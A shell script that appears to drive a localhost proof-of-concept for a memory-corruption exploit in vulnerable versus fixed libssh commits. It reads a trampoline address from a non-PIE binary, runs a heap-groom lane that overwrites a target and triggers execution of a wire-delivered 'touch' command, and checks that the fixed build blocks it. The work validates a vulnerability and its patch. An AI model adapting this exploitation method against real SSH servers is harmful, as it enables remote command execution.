#!/bin/sh
# W12 additive lane: reach the W11 no-detach benign command with the callee
# address taken from the compiled ELF symbol table, not from the client's own
# process image. The harness is built -no-pie so exec_trampoline has a fixed
# address; the driver reads that address with nm and passes it as an argument.
# The command still arrives in wire bytes. No sanitizer, no library source
# change, no allocator environment variable. All traffic is on 127.0.0.1.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_plain() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-plain-vuln vuln" "$FS build-plain-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_plain "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -no-pie -DW12_FIXEDADDR -Iasan-shim \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-plain-$kind-fa" || exit 1
    # The address must be a build-time constant, not a run-local PIE offset.
    readelf -h "real_wire-plain-$kind-fa" | grep -q 'EXEC (Executable file)' || {
        echo "FAIL-$kind binary is not non-PIE"; exit 1;
    }
    nm "real_wire-plain-$kind-fa" | grep -qw exec_trampoline || {
        echo "FAIL-$kind trampoline symbol missing"; exit 1;
    }
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

fn_addr() {
    nm "real_wire-plain-$1-fa" | awk '$3 == "exec_trampoline" { print "0x" $1 }'
}

PASS=0; FAIL=0
run_lane() {
    # name, binary kind, address from that binary's symbol table
    n_name=$1; n_kind=$2; n_addr=$3
    mkdir -p "fixedaddr-run/$n_name"
    ln -sf "$HERE/hostkey" "fixedaddr-run/$n_name/hostkey"
    (cd "fixedaddr-run/$n_name" && timeout 25 \
        "$HERE/real_wire-plain-$n_kind-fa" ./hostkey groom-fixedaddr "$n_addr") \
        >"evidence-fixedaddr-$n_name.out" 2>&1
    echo "lane $n_name addr=$n_addr rc=$?"
}

check_vuln() {
    c_out=evidence-fixedaddr-$1.out
    c_file=no
    [ -f "fixedaddr-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_fa=$(grep -c 'CLIENT sent exec cmd=touch evidence-wire-vuln-groom-exec.marker fn=0x.* fixedaddr=1' "$c_out")
    c_det=$(grep -c 'SERVER groom-survive saved' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_e" = 1 ] &&
       [ "$c_ok" = 1 ] && [ "$c_fa" = 1 ] && [ "$c_det" = 0 ] &&
       [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t exec=$c_e fixedaddr=$c_fa detach=$c_det file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_ok $c_fa $c_det $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-fixedaddr-$1.out
    c_file=no
    [ -f "fixedaddr-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_t" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 target=0 exec=0 file=no"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_file]"
    fi
}

VFN=$(fn_addr vuln)
FFN=$(fn_addr fixed)
echo "nm addresses: vuln=$VFN fixed=$FFN"

run_lane vuln-fixedaddr vuln "$VFN"
check_vuln vuln-fixedaddr
if [ -f fixedaddr-run/vuln-fixedaddr/evidence-wire-vuln-groom-exec.marker ]; then
    mv fixedaddr-run/vuln-fixedaddr/evidence-wire-vuln-groom-exec.marker \
       evidence-fixedaddr-sideeffect.kept
fi

run_lane fixed-fixedaddr fixed "$FFN"
check_fixed fixed-fixedaddr

VPAT=${VFN#0x}
while [ "${VPAT#0}" != "$VPAT" ]; do VPAT=${VPAT#0}; done
VPAT="0x$VPAT"
echo "client fn pattern: $VPAT"
# Determinism: three independent launches use the same build-time address.
for i in 1 2 3; do
    name="vuln-repeat$i"
    run_lane "$name" vuln "$VFN"
    out=evidence-fixedaddr-$name.out
    sent=$(grep -c "CLIENT sent exec cmd=touch evidence-wire-vuln-groom-exec.marker fn=$VPAT fixedaddr=1" "$out")
    execd=$(grep -c 'SERVER EXEC trampoline' "$out")
    if [ "$sent" = 1 ] && [ "$execd" = 1 ]; then
        PASS=$((PASS+1)); echo "PASS-$name fixed address=$VFN exec=1"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$name sent=$sent exec=$execd want_addr=$VFN"
    fi
    if [ -f "fixedaddr-run/$name/evidence-wire-vuln-groom-exec.marker" ]; then
        mv "fixedaddr-run/$name/evidence-wire-vuln-groom-exec.marker" \
           "evidence-fixedaddr-repeat$i.kept"
    fi
done

# Separate processes: compile the client from the same source with the
# trampoline renamed, so its own image has no exec_trampoline address to
# borrow. It sends the address read from the SERVER binary's ELF.
clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -no-pie -DW12_FIXEDADDR -Iasan-shim \
    -Dexec_trampoline=client_trampoline \
    -I build-plain-vuln/src -I "$VS/src" -I "$VS/include" \
    -I build-plain-vuln/include -I build-plain-vuln \
    real_wire.c build-plain-vuln/src/libssh.a -lcrypto -lpthread -ldl \
    -o real_wire-plain-client-fa || exit 1
nm real_wire-plain-client-fa | grep -qw exec_trampoline && {
    echo "FAIL client binary still exports exec_trampoline"; exit 1;
}
CFN=$(nm real_wire-plain-client-fa | awk '$3 == "client_trampoline" { print "0x" $1 }')
echo "separate client trampoline=$CFN server address=$VFN"

run_separate() {
    s_name=$1; s_kind=$2
    s_dir="separate-run/$s_name"
    mkdir -p "$s_dir"
    ln -sf "$HERE/hostkey" "$s_dir/hostkey"
    (cd "$s_dir" && timeout 12 \
        "$HERE/real_wire-plain-$s_kind-fa" ./hostkey server-fixedaddr "$VFN") \
        >"evidence-fixedaddr-$s_name-server.out" 2>&1 &
    s_pid=$!
    sleep 1
    (cd "$s_dir" && timeout 15 \
        "$HERE/real_wire-plain-client-fa" ./hostkey client-only "$VFN") \
        >"evidence-fixedaddr-$s_name-client.out" 2>&1
    s_crc=$?
    wait "$s_pid"; s_src=$?
    echo "lane $s_name client_rc=$s_crc server_rc=$s_src"
}

run_separate vuln-separate vuln
c_out=evidence-fixedaddr-vuln-separate-client.out
s_out=evidence-fixedaddr-vuln-separate-server.out
c_fa=$(grep -c 'CLIENT sent exec cmd=touch evidence-wire-vuln-groom-exec.marker fn=0x.* fixedaddr=1' "$c_out")
s_e=$(grep -c 'SERVER EXEC trampoline' "$s_out")
c_file=no
[ -f separate-run/vuln-separate/evidence-wire-vuln-groom-exec.marker ] && c_file=yes
if [ "$c_fa" = 1 ] && [ "$s_e" = 1 ] && [ "$c_file" = yes ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-separate client_fixed=$c_fa server_exec=$s_e file=$c_file"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-separate got[$c_fa $s_e $c_file]"
fi
if [ -f separate-run/vuln-separate/evidence-wire-vuln-groom-exec.marker ]; then
    mv separate-run/vuln-separate/evidence-wire-vuln-groom-exec.marker \
       evidence-fixedaddr-separate-sideeffect.kept
fi

run_separate fixed-separate fixed
c_out=evidence-fixedaddr-fixed-separate-client.out
s_out=evidence-fixedaddr-fixed-separate-server.out
s_e=$(grep -c 'SERVER EXEC trampoline' "$s_out")
c_file=no
[ -f separate-run/fixed-separate/evidence-wire-vuln-groom-exec.marker ] && c_file=yes
if [ "$s_e" = 0 ] && [ "$c_file" = no ]; then
    PASS=$((PASS+1)); echo "PASS-fixed-separate exec=0 file=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-fixed-separate got[$s_e $c_file]"
fi

echo "fixedaddr: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
